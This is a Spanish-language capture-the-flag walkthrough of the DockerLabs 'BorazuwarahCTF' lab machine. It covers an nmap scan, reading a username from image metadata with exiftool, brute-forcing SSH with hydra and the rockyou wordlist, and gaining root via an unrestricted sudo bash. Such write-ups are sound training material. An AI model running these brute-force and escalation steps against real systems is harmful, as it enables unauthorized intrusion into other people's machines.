BorazuwarahCTF-DockerLabs🇪🇸

**1.1En primer lugar deberes de descomprimir el archivo trust.zip.**
```bash
unzip borazuwarahctf.zip
```

*Nos quedará asi*

<img width="607" height="137" alt="image" src="https://github.com/user-attachments/assets/36290fad-08e6-4ef7-a5d9-ec8c5b4e4b36" />

**2.Iniciaremos la máquina**
```bash
chmod +x auto_deploy.sh
sudo ./auto_deploy.sh borazuwarahctf.tar
```
<img width="868" height="442" alt="image" src="https://github.com/user-attachments/assets/e7526d78-8dee-4d5e-8b8d-f6e0938370be" />

**3. Comprobaremos la conexión hacia la dirección.**

```bash
ping -c3 172.17.0.2
```

<img width="860" height="262" alt="image" src="https://github.com/user-attachments/assets/1f549eda-4a78-4c6f-af61-fe0aaa0a56a0" />


**4.Vamos a realizar un saaneo para ver los puertos abiertos con `nmap`.**
```bash
nmap -sCV 172.17.0.2
```
*Podremos apreciar que los puertos 22 y 80 están abiertos*

<img width="864" height="414" alt="image" src="https://github.com/user-attachments/assets/83efe827-65d3-4a1b-8b93-5ce9d82cade6" />

**5. Ahora si entramos en la web podremos verla y guardaremos la foto del kinder**

<img width="1053" height="780" alt="image" src="https://github.com/user-attachments/assets/2f494098-1fa6-4dd4-bad0-e5708feea5cf" />

**6. Con la herramienta de exiftool podremos ver los metadatas de la imagen y ver el usuario**
```bash
exiftool kinder.jpeg
```
<img width="846" height="537" alt="image" src="https://github.com/user-attachments/assets/6483feae-46f7-4851-b063-423b2f46fc0e" />

**7. Ahora procederemos a realizar el ataque con hydra para poder obtener la contraseña mediante fuerza bruta**

```bash
hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

<img width="906" height="416" alt="image" src="https://github.com/user-attachments/assets/03ec2e7e-8fad-4ea8-b97d-7d8f2b3d26c5" />


**8.Después de haber obtenido la contraseña iniiaremos un ssh para entrar a la terminal remoto.**

```bash
ssh borazuwarah@172.17.0.2
```
*Password: 123456*

<img width="896" height="401" alt="image" src="https://github.com/user-attachments/assets/6253dc59-0a55-4f7a-817c-8e554254814e" />


**9. Por último realizaremos una escalada de privilegios**

**Primero ejecutamos `sudo -l` para ver nuestros privilegios, y vemos que podemos ejecutar /bin/bash**


<img width="898" height="163" alt="image" src="https://github.com/user-attachments/assets/cfea4ca3-b2e2-4af3-b8d8-3d341c12375a" />


```bash
sudo bash
```

<img width="900" height="93" alt="image" src="https://github.com/user-attachments/assets/c4dcdc0f-13aa-4329-bb81-fa5787a86f07" />




